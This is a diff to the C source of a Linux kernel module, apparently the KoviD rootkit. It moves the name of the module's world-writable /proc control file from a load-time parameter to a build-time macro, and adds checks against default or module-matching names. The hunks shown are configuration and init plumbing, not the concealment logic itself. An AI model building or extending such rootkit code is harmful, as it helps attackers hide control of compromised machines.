@@ -35,6 +35,10 @@
 #ifndef MODNAME
 #pragma message "Missing \'MODNAME\' compilation directive. See Makefile."
 #endif
+#ifndef PROCNAME
+#error "Missing \'PROCNAME\' compilation directive. See Makefile."
+#endif
+
 
 #ifndef PRCTIMEOUT
 /**
@@ -68,9 +72,6 @@ static unsigned int op_lock;
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
 static DEFINE_SPINLOCK(hiddenstr_spin);
-static char *procname;
-module_param(procname, charp, 0644);
-MODULE_PARM_DESC(procname, "/proc/<name>");
 
 /** gcc  - fuck 32 bits shit (for now!) */
 #ifndef __x86_64__
@@ -660,7 +661,7 @@ int kv_add_proc_interface(void) {
         return 0;
 
 try_reload:
-    rrProcFileEntry = proc_create(procname, 0666, NULL, &proc_file_fops);
+    rrProcFileEntry = proc_create(PROCNAME, 0666, NULL, &proc_file_fops);
     if(lock && !rrProcFileEntry)
         goto proc_file_error;
     if(!lock) {
@@ -694,7 +695,7 @@ proc_file_error:
     prinfo("Could not create proc file.\n");
     return 0;
 leave:
-    prinfo("/proc/%s loaded, timeout: %ds\n", procname, PRC_TIMEOUT);
+    prinfo("/proc/%s loaded, timeout: %ds\n", PROCNAME, PRC_TIMEOUT);
     return 1;
 }
 
@@ -707,12 +708,12 @@ static void _proc_rm_wrapper(void) {
     mutex_lock(&prc_mtx);
     if(rrProcFileEntry) {
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
-        remove_proc_entry(procname, NULL);
+        remove_proc_entry(PROCNAME, NULL);
 #else
         proc_remove(rrProcFileEntry);
 #endif
         rrProcFileEntry = NULL;
-        prinfo("/proc/%s unloaded.\n", procname);
+        prinfo("/proc/%s unloaded.\n", PROCNAME);
     }
     mutex_unlock(&prc_mtx);
 }
@@ -762,12 +763,21 @@ static void _unroll_init(void) {
 static int __init kv_init(void) {
 
     int rv = 0;
-    char *tname, *magik;
+    char *tname, *magik, *procname_err = "";
 
-    if (!procname)
+    if (strlen(PROCNAME) == 0) {
+        procname_err = "Empty PROCNAME build parameter. Check Makefile.";
+        prinfo("%d\n", __LINE__);
+    } else if (!strncmp(PROCNAME, "changeme", 5)) {
+        procname_err = "You must rename PROCNAME. Check Makefile.";
+        prinfo("%d\n", __LINE__);
+    } else if (!strncmp(PROCNAME, "kovid", 5) || !strncmp(PROCNAME, MODNAME, strlen(PROCNAME))) {
+        procname_err = "PROCNAME should not be same as module name. Check Makefile.";
+        prinfo("%d\n", __LINE__);
+    }
+
+    if (*procname_err != 0)
         goto procname_missing;
-
-    prinfo("procname: %s\n", procname);
 
     if (!kv_pid_init(kv_kall_load_addr()))
         goto addr_error;
@@ -856,7 +866,7 @@ sys_init_error:
     rv = -EFAULT;
     goto leave;
 procname_missing:
-    prerr("Missing parameter \"procname\"\n");
+    prerr("%s\n", procname_err);
     rv = -EFAULT;
 leave:
     return rv;
